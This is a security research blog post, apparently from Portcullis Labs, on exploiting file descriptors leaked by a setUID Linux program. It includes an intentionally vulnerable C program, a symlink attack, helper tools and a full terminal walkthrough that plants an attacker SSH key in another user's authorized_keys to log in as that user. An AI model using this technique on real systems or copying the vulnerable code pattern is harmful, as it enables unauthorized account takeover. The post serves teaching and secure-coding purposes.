<!DOCTYPE html>
<html lang="en-US" xmlns:fb="https://www.facebook.com/2008/fbml" xmlns:addthis="https://www.addthis.com/help/api-spec"  prefix="og: http://ogp.me/ns#">
<head>
<meta charset="UTF-8" />
<title>Exploiting inherited file handles in setUID programs | Portcullis Labs</title>
<meta name="viewport" content="initial-scale = 1.0, maximum-scale = 1.0, user-scalable = no, width = device-width">
<!--[if lt IE 9]><script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

<link rel="stylesheet" href="https://portcullislabs.github.io/wp-content/themes/Portcullisfinal/style.css" media="screen" />


<!-- This site is optimized with the Yoast WordPress SEO plugin v1.4.7 - http://yoast.com/wordpress/seo/ -->
<link rel="canonical" href="https://portcullislabs.github.io/blog/exploiting-inherited-file-handles-in-setuid-programs/" />
<meta property='og:locale' content='en_US'/>
<meta property='og:type' content='article'/>
<meta property='og:title' content='Exploiting inherited file handles in setUID programs - Portcullis Labs'/>
<meta property='og:url' content='https://portcullislabs.github.io/blog/exploiting-inherited-file-handles-in-setuid-programs/'/>
<meta property='og:site_name' content='Portcullis Labs'/>
<!-- / Yoast WordPress SEO plugin. -->

<link rel="alternate" type="application/rss+xml" title="Portcullis Labs &raquo; Feed" href="https://portcullislabs.github.io/feed/" />
<link rel='stylesheet' id='TheStyleSheets-css'  href='https://portcullislabs.github.io/wp-content/plugins/asm-brush/style.css?ver=3.8.5' type='text/css' media='all' />
<link rel='stylesheet' id='wpfb-css'  href='//portcullislabs.github.io/wp-content/plugins/wp-filebase/wp-filebase.css?t=1475825177&#038;ver=3.4.4' type='text/css' media='all' />
<link rel='stylesheet' id='contact-form-7-css'  href='https://portcullislabs.github.io/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=3.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='css3lightbox_style-css'  href='https://portcullislabs.github.io/wp-content/plugins/css3lightbox/assets/style.css?ver=3.8.5' type='text/css' media='all' />
<link rel='stylesheet' id='addthis_all_pages-css'  href='https://portcullislabs.github.io/wp-content/plugins/addthis/frontend/build/addthis_wordpress_public.min.css?ver=3.8.5' type='text/css' media='all' />
<!--[if lte IE 7]>
<link rel='stylesheet' id='style.ie7.css-css'  href='https://portcullislabs.github.io/wp-content/themes/Portcullisfinal/style.ie7.css?ver=3.8.5' type='text/css' media='screen' />
<![endif]-->
<link rel='stylesheet' id='style.responsive.css-css'  href='https://portcullislabs.github.io/wp-content/themes/Portcullisfinal/style.responsive.css?ver=3.8.5' type='text/css' media='all' />
<script type='text/javascript' src='https://portcullislabs.github.io/wp-content/themes/Portcullisfinal/jquery.js?ver=3.8.5'></script>
<script type='text/javascript' src='https://portcullislabs.github.io/wp-content/themes/Portcullisfinal/script.js?ver=3.8.5'></script>
<script type='text/javascript' src='https://portcullislabs.github.io/wp-content/themes/Portcullisfinal/script.responsive.js?ver=3.8.5'></script>

 

<link rel="shortcut icon" href="https://portcullislabs.github.io/wp-content/themes/Portcullisfinal/favicon.ico" /><link rel='header_link' href='/' /><style type="text/css" id="syntaxhighlighteranchor"></style>
<script data-cfasync="false" type="text/javascript">if (window.addthis_product === undefined) { window.addthis_product = "wpp"; } if (window.wp_product_version === undefined) { window.wp_product_version = "wpp-6.1.4"; } if (window.wp_blog_version === undefined) { window.wp_blog_version = "3.8.5"; } if (window.addthis_share === undefined) { window.addthis_share = {}; } if (window.addthis_config === undefined) { window.addthis_config = {"data_track_clickback":false,"ignore_server_config":true,"ui_atversion":300}; } if (window.addthis_layers === undefined) { window.addthis_layers = {}; } if (window.addthis_layers_tools === undefined) { window.addthis_layers_tools = []; } else {  } if (window.addthis_plugin_info === undefined) { window.addthis_plugin_info = {"info_status":"enabled","cms_name":"WordPress","plugin_name":"Share Buttons by AddThis","plugin_version":"6.1.4","plugin_mode":"WordPress","anonymous_profile_id":"wp-3219ffbb80dfd9f649eb0d9d76c4d2e4","page_info":{"template":"posts","post_type":""},"sharing_enabled_on_post_via_metabox":false}; } 
                    (function() {
                      var first_load_interval_id = setInterval(function () {
                        if (typeof window.addthis !== 'undefined') {
                          window.clearInterval(first_load_interval_id);
                          if (typeof window.addthis_layers !== 'undefined' && Object.getOwnPropertyNames(window.addthis_layers).length > 0) {
                            window.addthis.layers(window.addthis_layers);
                          }
                          if (Array.isArray(window.addthis_layers_tools)) {
                            for (i = 0; i < window.addthis_layers_tools.length; i++) {
                              window.addthis.layers(window.addthis_layers_tools[i]);
                            }
                          }
                        }
                     },1000)
                    }());
                </script> <script data-cfasync="false" type="text/javascript"src="https://s7.addthis.com/js/300/addthis_widget.js#pubid=ra-50cef03053621092" async="async"></script><meta name="norton-safeweb-site-verification" content="t4bvmzb47z4-fa69d4guwu4ud9-4fjyp-p5zu1zngnplt83xrfxxg18yea8ev95lh9h4vlzkclbcvyu37rz5etuoczh7z3827pjv3s73uannz0xkwzfw2iiu4ol7o83f" />
</head>
<body class="single single-post postid-6538 single-format-standard">

<div id="portcullis-main">


<!-- Cisco -->
<div id="cisco">
    <div id="cisco-container" class="clearfix">
        <div class="left">
            <a href="http://www.cisco.com/" target="_blank"><img class="cisco-logo" src="https://portcullislabs.github.io/wp-content/themes/Portcullisfinal/images/portcullis_cisco_logo.png" alt=""></a>
            <a href="http://www.cisco.com/web/about/ac49/ac0/ac1/ac259/portcullis.html" class="learnmore">Learn More <img src="https://portcullislabs.github.io/wp-content/themes/Portcullisfinal/images/more-triangle.png" alt=""></a>
        </div>
        <div class="right">
            <div class="move-right"><a href="http://www.cisco.com/web/about/index.html" target="_blank" class="move-right">About Cisco</a></div>
        </div>
    </div>
</div>
<!-- /#cisco -->

<header class="clearfix portcullis-header clickable">


    <div class="portcullis-shapes">
		<div class="portcullis-headline" data-left="14.6%">
    <a href="https://portcullislabs.github.io/">Portcullis Labs</a>
</div>
		<div class="portcullis-slogan" data-left="16.4%">Research and Development</div>
<div class="logo"><a href="https://www.portcullis-security.com"><img style="border:none;" src="/wp-content/themes/Portcullisfinal/images/logo.png" /></a></div>

<div class="portcullis-textblock portcullis-object1741532833" data-left="92.34%">
    
</div><div class="portcullis-textblock portcullis-object1269462037" data-left="97.93%">
    
</div>
            </div>

<nav class="portcullis-nav clearfix">
    
<ul class="portcullis-hmenu">
	<li class="menu-item-268"><a href="https://portcullislabs.github.io" title="Home">Home</a>
	</li>
	<li class="menu-item-6568"><a href="https://portcullislabs.github.io/advisories/" title="Advisories">Advisories</a>
	</li>
	<li class="menu-item-83"><a href="https://portcullislabs.github.io/blog/" title="Blog">Blog</a>
	</li>
	<li class="menu-item-66"><a href="https://portcullislabs.github.io/presentations/" title="Presentations">Presentations</a>
	</li>
	<li class="menu-item-62"><a href="https://portcullislabs.github.io/tools/" title="Tools">Tools</a>
	</li>
	<li class="menu-item-64"><a href="https://portcullislabs.github.io/whitepapers/" title="Whitepapers">Whitepapers</a>
	</li>
	<li class="menu-item-59"><a href="https://portcullislabs.github.io/downloads/" title="Downloads">Downloads</a>
	</li>
</ul>
 
    </nav>

                    
</header>

<div class="portcullis-sheet clearfix">
            <div class="portcullis-layout-wrapper clearfix">
                <div class="portcullis-content-layout">
                    <div class="portcullis-content-layout-row">
                        <div class="portcullis-layout-cell portcullis-content clearfix">
							<article id="post-6538"  class="portcullis-post portcullis-article  post-6538 post type-post status-publish format-standard hentry category-blog tag-analysis tag-auditing tag-exploit tag-root tag-unix">
                                <div class="portcullis-postmetadataheader"><h1 class="portcullis-postheader">Exploiting inherited file handles in setUID programs</h1></div>                                                <div class="portcullis-postheadericons portcullis-metadata-icons"><span class="portcullis-postdateicon"><span class="date">Published</span> <span class="entry-date" title="17:00">28/06/2018</span></span> | <span class="portcullis-postauthoricon"><span class="author">By</span> <span class="author vcard"><a class="url fn n" href="https://portcullislabs.github.io/author/mrl/" title="View all posts by MRL">MRL</a></span></span></div>                <div class="portcullis-postcontent clearfix"><div class="at-above-post addthis_tool" data-url="https://portcullislabs.github.io/blog/exploiting-inherited-file-handles-in-setuid-programs/"></div><!-- AddThis Button BEGIN -->
<div class="addthis_toolbox addthis_default_style "><a class="addthis_button_email"><a class="addthis_button_twitter"></a><a class="addthis_button_reddit"></a></a>
</div><p>In this post we look at at one of many security problems that pentesters and security auditors find in setUID programs. It&#8217;s fairly common for child processes to inherit any open file handles in the parent process (though there are ways to avoid this). In certain cases this can present a security flaw. This is what we&#8217;ll look at in the context of setUID programs on Linux.<span id="more-6538"></span></p>
<p>I was reminded of this technique as I tackled an <a href="https://exploit-exercises.com/nebula/level11/">old hacker challenge</a> recently. This a fun challenge. And there&#8217;s a much easier solution than using the technique I&#8217;m going to cover here. Maybe try both the hard way and the easy way.</p>
<h2>Example program</h2>
<p>Here&#8217;s a fairly minimal test case of example code &#8211; inspired by the nebula challenge code.</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char **argv)
{
 char *cmd = argv[1];
 char tmpfilepath[] = &quot;/tmp/tmpfile&quot;;  // Modern systems need &quot;sysctl fs.protected_symlinks=0&quot; or &quot;chmod 0777 /tmp&quot; for this to be vulnerable to the symlink attack we'll use later.
 char data[] = &quot;pointless data\n&quot;;

int fd = open(tmpfilepath, O_CREAT|O_RDWR, 0600);
 unlink(tmpfilepath);
 write(fd, data, strlen(data));
 setuid(getuid());
 system(cmd);
}
</pre>
<p>Let&#8217;s start by compiling this and setting the setUID bit so we have an example to work with:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
root@challenge:/# useradd -m tom # victim/target user
root@challenge:/# useradd -m bob # attacker
root@challenge:/# cd ~bob
root@challenge:/home/bob# cp /share/fd-leak.c .
root@challenge:/home/bob# gcc -o fd-leak fd-leak.c
root@challenge:/home/bob# chown tom:tom fd-leak
root@challenge:/home/bob# chmod 4755 fd-leak
root@challenge:/home/bob# ls -l fd-leak
-rwsr-xr-x 1 root root 8624 Apr 12 11:06 fd-leak
root@challenge:/home/bob# su - bob
bob@challenge:~$ ./fd-leak id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
</pre>
<p>For exploitation later, we&#8217;ll also need the target user (tom in this case) to have a .ssh directory in their home directory:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
root@challenge:/# mkdir ~tom/.ssh; chown tom:tom ~tom/.ssh
</pre>
<p>What this program lacks in realism is hopefully made up for in its simplicity.</p>
<h2>Normal operation</h2>
<p>As can be seen from the code above, the program should:</p>
<ol>
<li>Create the file /tmp/tmpfile, then delete it. A file descriptor is retained</li>
<li>Drop privileges. This is poor code for dropping privileges, btw. It suffices for this example, though</li>
<li>Run a command that is supplied as an argument. It should run as the invoking user, not as the target user (tom)</li>
</ol>
<p>Let&#8217;s try it out (note that I modify .bashrc to make it clearer to the reader when a subshell has been spawned):</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
root@challenge:/home/bob# su - bob
bob@challenge:~$ ./fd-leak id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@challenge:~$ echo 'echo subshell...' &gt; .bashrc
bob@challenge:~$ ./fd-leak id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@challenge:~$ ./fd-leak bash -p
subshell...
bob@challenge:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
root@challenge:/home/bob# useradd -m tom
root@challenge:/home/bob# su - tom
$ mkdir .ssh
$ ls -la
total 28
drwxr-xr-x 3 tom tom 4096 Apr 12 11:42 .
drwxr-xr-x 2 tom tom 4096 Apr 12 11:42 .ssh
...
</pre>
<p>So, yes fd-leak appears to drop privileges. (Our spawned shell isn&#8217;t responsible for the drop in privileges as I&#8217;ve hopefully illustrated by passing -p to bash above and by running id directly).</p>
<p>Finally, we expect the child process to inherit a file handle to the now deleted file /tmp/tmpfile:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
bob@challenge:~$ ls -l /proc/self/fd
total 0
lrwx------ 1 bob bob 64 Apr 12 11:22 0 -&gt; /dev/pts/2
lrwx------ 1 bob bob 64 Apr 12 11:22 1 -&gt; /dev/pts/2
lrwx------ 1 bob bob 64 Apr 12 11:22 2 -&gt; /dev/pts/2
lrwx------ 1 bob bob 64 Apr 12 11:22 3 -&gt; '/tmp/tmpfile (deleted)'
lr-x------ 1 bob bob 64 Apr 12 11:22 4 -&gt; /proc/53982/fd
</pre>
<p>It does. We&#8217;re all set.</p>
<h2>High level exploit path</h2>
<p>Our approach to attacking this vulnerable program will follow these high level steps which are covered in more detail in the sections below:</p>
<ol>
<li>Create a symlink that the vulnerable code will try to write to. This way we can create a file in a location of our choosing and with a name we choose. We&#8217;ll choose ~tom/.ssh/authorized_keys</li>
<li>We&#8217;ll run some code in the context of a child process to manipulate the open file handle so we can write the contents of authorized_keys file</li>
<li>Finally, we log with via SSH</li>
</ol>
<h2>Practical exploitation</h2>
<h3>Step 1: Symlink attack</h3>
<p>Simple:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
</pre>
<p>This step was harder in the nebula challenge, but I didn&#8217;t want to cloud the issue.</p>
<p>If we run the code now, we see that the authorized_keys file is created, but we don&#8217;t control the contents.</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
-rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile
ln: failed to create symbolic link '/tmp/tmpfile': File exists
bob@challenge:~$ ls -l /tmp/tmpfile
lrwxrwxrwx 1 bob bob 30 Apr 12 12:11 /tmp/tmpfile -&gt; /home/tom/.ssh/authorized_keys
bob@challenge:~$ ./fd-leak id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@challenge:~$ ls -l ~tom/.ssh/authorized_keys
-rw------- 1 tom bob 15 Apr 12 12:12 /home/tom/.ssh/authorized_keys
</pre>
<p>We also don&#8217;t control the permissions the file gets created with. (Feel free to try the above on authorized_keys2 after running &#8220;umask 0&#8243; to check).</p>
<h3>Step 2: Running code in child process</h3>
<p>It&#8217;s pretty easy to run code because of the nature of the program. Again, this was harder in the nebula challenge. We can see the file handle we want listed in /proc/self/fd. It&#8217;s file descriptor 3:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
bob@challenge:~$ ln -s ~tom/.ssh/authorized_keys /tmp/tmpfile

bob@challenge:~$ ls -l /tmp/tmpfile
lrwxrwxrwx 1 bob bob 30 Apr 12 12:25 /tmp/tmpfile -&gt; /home/tom/.ssh/authorized_keys
bob@challenge:~$ ./fd-leak bash
subshell...
bob@challenge:~$ ls -l /proc/self/fd
total 0
lrwx------ 1 bob bob 64 Apr 12 12:26 0 -&gt; /dev/pts/1
lrwx------ 1 bob bob 64 Apr 12 12:26 1 -&gt; /dev/pts/1
lrwx------ 1 bob bob 64 Apr 12 12:26 2 -&gt; /dev/pts/1
lrwx------ 1 bob bob 64 Apr 12 12:26 3 -&gt; /home/tom/.ssh/authorized_keys
lr-x------ 1 bob bob 64 Apr 12 12:26 4 -&gt; /proc/54947/fd
</pre>
<p>So we can just &#8220;echo key &gt; /proc/self/fd/3&#8243;? Not really. That&#8217;s just a symlink. A symlink to a file that doesn&#8217;t exist to be precise. And it&#8217;s pointing to a location that we&#8217;d don&#8217;t have privileges to create. Let&#8217;s confirm that:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
bob@challenge:~$ ls -l /home/tom/.ssh/authorized_keys
-rw------- 1 tom bob 15 Apr 12 12:25 /home/tom/.ssh/authorized_keys
bob@challenge:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@challenge:~$ echo &gt; /home/tom/.ssh/authorized_keys
bash: /home/tom/.ssh/authorized_keys: Permission denied
bob@challenge:~$ echo &gt; /tmp/tmpfile
bash: /tmp/tmpfile: Permission denied
bob@challenge:~$ echo &gt; /proc/self/fd/3
bash: /proc/self/fd/3: Permission denied
</pre>
<p>We need to write to file descriptor 3&#8230; So is there are version of cat that works with file descriptors? Not that I know of. Let&#8217;s write some small utilities that will help us get to grips with accessing inherited file handles. We&#8217;ll write 3 tools:</p>
<ul>
<li>read &#8211; that uses the read function to read a set number of bytes from a particular file descriptor</li>
<li>write &#8211; that writes a string of our choosing to a particular file descriptor</li>
<li>lseek &#8211; that lets us position our read/write</li>
</ul>
<p>Here&#8217;s the source and compilation of the (very crude) demo tools:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
bob@challenge:~$ cat read.c
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[]) {
 char buf[1024];
 memset(buf, 0, 1024);
 int r = read(atoi(argv[1]), buf, 10);
 printf(&quot;Read %d bytes\n&quot;, r);
 write(1, buf, 10);
}

bob@challenge:~$ gcc -o read read.c
bob@challenge:~$ cat write.c
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[]) {
 printf(&quot;writing %s to fd %s\n&quot;, argv[2], argv[1]);
 write(atoi(argv[1]), argv[2], strlen(argv[2]));
}
bob@challenge:~$ gcc -o write write.c
bob@challenge:~$ cat lseek.c
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

int main(int argc, char *argv[]) {
 printf(&quot;seek to position %s on fd %s\n&quot;, argv[2], argv[1]);
 lseek(atoi(argv[1]), atoi(argv[2]), SEEK_SET);
}

bob@challenge:~$ gcc -o lseek lseek.c
</pre>
<p>Let&#8217;s see the tools in action. First we try to read, then write to file descriptor 3, but the read always returns 0 bytes:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
bob@challenge:~$ ./read 3
Read 0 bytes
bob@challenge:~$ ./write 3 hello
writing hello to fd 3
bob@challenge:~$ ./read 3
Read 0 bytes
</pre>
<p>The reason is that we need to seek to a location in the file that isn&#8217;t the end of the file. Let&#8217;s seek to position 0, the beginning of the file:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
bob@challenge:~$ ./lseek 3 0
seek to position 0 on fd 3
bob@challenge:~$ ./read 3
Read 10 bytes
pointless bob@challenge:~$ ./read 3
Read 10 bytes
data
hellobob@challenge:~$ ./read 3
Read 0 bytes
</pre>
<p>Much better.</p>
<p>Finally we need exploit the program above. We have two choices:</p>
<ul>
<li>Run a shell as before, then use our new tool to write the key to authorized_keys; or</li>
<li>Make a new tool using the functions shown above to write to authorized_keys.</li>
</ul>
<p>Let&#8217;s do the former. The latter is an exercise for the reader. Note that we need to seek to position 0 before we write our data. It&#8217;s important to overwrite the &#8220;pointless&#8221; message already there as that corrupts the authorized_keys file:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
bob@challenge:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/bob/.ssh/id_rsa): bobkey
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in bobkey.
Your public key has been saved in bobkey.pub.
bob@challenge:~$ cat bobkey.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge
bob@challenge:~$ ls -l bobkey.pub
-rw-r--r-- 1 bob bob 387 Apr 12 12:30 bobkey.pub
bob@challenge:~$ ./lseek 3 0
seek to position 0 on fd 3
bob@challenge:~$ ./write 3 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge'
 writing ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2PezJjFSI778OvONA5aqfM2Y2d0eYizOkcqTimy7dXfaEhSKnRSRyfwOfwOOaVpLdZW9NmfaPd5G8RY3n+3QwDIPv4Aw5oV+5Q3C3FRG0oZoe0NqvcDN8NeXZFbzvcWqrnckKDmm4gPMzV1rxMaRfFpwjhedyai9iw5GtFOshGZyCHBroJTH5KQDO9mow8ZxFKzgt5XwrfMzvBd+Mf7kE/QtD40CeoNP+GsvNZESxMC3pWfjZet0p7Jl1PpW9zAdN7zaQPH2l+GHzvgPuZDgn+zLJ4CB69kGkibEeu1c1T80dqDDL1DkN1+Kbmop9/5gzOYsEmvlA4DQC6nO9NCTb bob@challenge to fd 3
</pre>
<h3>Step 3: Logging in via SSH</h3>
<pre class="brush: bash; gutter: false; title: ; notranslate" title="">
bob@challenge:~$ ssh -i bobkey tom@localhost
$ id
uid=1002(tom) gid=1002(tom) groups=1002(tom)
</pre>
<p>We&#8217;re done. We exploited the leaked file descriptor to write data of our choosing to tom&#8217;s authorized_keys file. We used a slightly unrealistic symlink attack along the way, but that doesn&#8217;t invalidate our discussion of how to use and abuse leaked file descriptors.</p>
<h2>Conclusion</h2>
<p>Hacker challenges are fun. Even when you accidentally find a much harder solution and waste 10 times longer than necessary.</p>
<p>Writing secure setUID programs can be difficult. Particularly if you spawn child processes; particularly if you use open() in directories writable by other users. fs.protected_symlinks provides some mitigation for directories with the sticky bit set.</p>
<br /> <div class="wpcf7" id="wpcf7-f375-p238-o1"><form action="/contact/" method="post" class="wpcf7-form">
<div style="display: none;">
<input type="hidden" name="_wpcf7" value="323" />
<input type="hidden" name="_wpcf7_version" value="3.3.2" />
<input type="hidden" name="_wpcf7_unit_tag" value="wpcf7-f375-p238-o1" />
<input type="hidden" name="_wpnonce" value="4c6cc9abab" />
</div>
<style>.portcullis-content .layout-item-0 { background: ; padding: 10px;  }
.portcullis-content .layout-item-1 {  border-collapse: separate;  }
.portcullis-content .layout-item-2 { border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-color:#C7C7C7;border-right-color:#C7C7C7;border-bottom-color:#C7C7C7;border-left-color:#C7C7C7; color: #1C1C1C; background: #FAFAFA url('https://www.portcullis-security.com/wp-content/uploads/2013/01/983aa2.png') scroll; padding: 10px; border-radius: 5px;  }
.ie7 .post .layout-cell {border:none !important; padding:0 !important; }
.ie6 .post .layout-cell {border:none !important; padding:0 !important; }</p>
</style>
<div class="portcullis-content-layout layout-item-1">
<div class="portcullis-content-layout-row">
<div class="portcullis-layout-cell layout-item-2" style="width: 80%" >
</p>
</p>
<h3>Request to be added to the Portcullis Labs newsletter</h3>
<p>
 We will email you whenever a new tool, or post is added to the site.</p>
<p>Your Name (required)<br />
    <span class="wpcf7-form-control-wrap your-name"><input type="text" name="your-name" value="" class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" size="40" required="required" /></span> </p>
<p>Your Email (required)<br />
    <span class="wpcf7-form-control-wrap your-email"><input type="text" name="your-email" value="" class="wpcf7-form-control wpcf7-text wpcf7-email wpcf7-validates-as-required wpcf7-validates-as-email" size="40" required="required" /></span> </p>
<p><input type="hidden" name="porpoise" value="newsletter" /><br />
<input type="hidden" name="contact_form_7_recaptcha" value="g-recaptcha-jXIALDouvIjeSv1" class="g-recaptcha-explicit-id"><div id="g-recaptcha-jXIALDouvIjeSv1"></div><span class="wpcf7-form-control-wrap g-recaptcha-explicit" data-sitekey="6LdFERITAAAAAJKGS2TEXuWsyOxc-KxvAZBC8zE2"></span></p>
<p><input type="submit" value="Subscribe" class="wpcf7-form-control  wpcf7-submit" /></p>
</div>
</div>
</div>
<div class="wpcf7-response-output wpcf7-display-none"></div></form></div></br ><div style="clear:both;"></div><!-- AddThis Advanced Settings above via filter on the_content --><!-- AddThis Advanced Settings below via filter on the_content --><!-- AddThis Button BEGIN -->
<div class="addthis_toolbox addthis_toolbox addthis_default_style addthis_32x32_style"><a class="addthis_button_email"><a class="addthis_button_twitter"></a><a class="addthis_button_reddit"></a></a>
</div><!-- AddThis Advanced Settings generic via filter on the_content --><!-- AddThis Share Buttons above via filter on the_content --><!-- AddThis Share Buttons below via filter on the_content --><div class="at-below-post addthis_tool" data-url="https://portcullislabs.github.io/blog/exploiting-inherited-file-handles-in-setuid-programs/"></div><!-- AddThis Share Buttons generic via filter on the_content --></div>
                                                                
</article>
				

                        </div>
                                            </div>
                </div>
            </div><footer class="portcullis-footer clearfix"><div class="portcullis-content-layout">
    <div class="portcullis-content-layout-row">
    <div class="portcullis-layout-cell" style="width: 100%">
        <p><br></p>
    </div>
    </div>
</div>
<div class="portcullis-content-layout">
    <div class="portcullis-content-layout-row">
    <div class="portcullis-layout-cell" style="width: 33%">
        <p style="text-align: left;"><span style="font-size: 17px; padding-left:40px; font-family: Tahoma;"><span style="color: #ffffff;">Research and Development</span><br></span></p>
        <ul>
        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://portcullislabs.github.io/advisories/">Advisories</a><br></span></li>
        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://portcullislabs.github.io/blog/">Blog</a><br></span></li>
        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://portcullislabs.github.io/presentations/">Presentations</a><br></span></li>
        <li style="text-align: left; padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://portcullislabs.github.io/tools/">Tools</a><br></span></li>
        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://portcullislabs.github.io/whitepapers/">Whitepapers</a><br></span></li>
        <li style="text-align: left;padding-left:50px;"><span style="font-size: 12px; font-family: Tahoma;"><a href="https://portcullislabs.github.io/downloads/">Downloads</a><br></span></li>
               </ul>
        <p><br></p>
    </div><div class="portcullis-layout-cell" style="width: 34%">
        <p style="text-align: left;"><span style="font-size: 17px;"><span style="font-family: Tahoma;"><span style="font-weight: normal; color: #ffffff;">Company</span><br></span></span></p>
        <ul>
       <li style="text-align: left;"><span style="font-family: Tahoma;"><a href="https://portcullislabs.github.io/contact-us/">Contact Us</a><span style="font-size: 12px;"><br></span></span></li>
        <li style="text-align: left;"><span style="font-family: Tahoma;"><a href="https://www.portcullis-security.com">Portcullis Computer Security Services</a><span style="font-size: 12px;"><br></span></span></li>
                </ul>
        <br>
    </div><div class="portcullis-layout-cell" style="width: 33%">
       <span style="color: #ffffff;"><br>
        <br>
        <p style="text-align: left;"><span style="color: #ffffff; font-family: Tahoma;"><span style="color: #ffffff;"><span style="font-size: 15px; color: #ffffff;">Follow Us</span> <span style="font-weight: bold;"> <a href="http://www.twitter.com/portcullislabs" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Portcullis Twitter" class="" src="https://portcullislabs.github.io/wp-content/themes/Portcullisfinal/images/twitterfooter.png"></a> <a href="http://www.linkedin.com/company/portcullis?trk=hb_tab_compy_id_505813" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Portcullis Linkedin" class="" src="https://portcullislabs.github.io/wp-content/themes/Portcullisfinal/images/linkedinfooter.png"></a> <a href="http://www.facebook.com/PortcullisCSL" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Portcullis Facebook" class="" src="https://portcullislabs.github.io/wp-content/themes/Portcullisfinal/images/facebookfooter.png"></a> <a href="https://plus.google.com/114151721382021849037/posts" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Google Plus" class="" src="https://portcullislabs.github.io/wp-content/themes/Portcullisfinal/images/googleplusfooter.png"></a> <a href="/rss" target="_blank"><img width="16" height="16" style=" border-top-width: 0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: 0px;" alt="Portcullis Rss" class=""img src="https://portcullislabs.github.io/wp-content/uploads/2013/04/rss.png"></a></span></span></span></p>
        <p><br></p>
    </div>
    </div>
</div>
<div class="portcullis-content-layout">
    <div class="portcullis-content-layout-row">
    <div class="portcullis-layout-cell" style="width: 100%">
        <p><br></p>
        <hr>
    </div>
    </div>
</div>
<div class="portcullis-content-layout">
    <div class="portcullis-content-layout-row">
    <div class="portcullis-layout-cell" style="width: 50%">
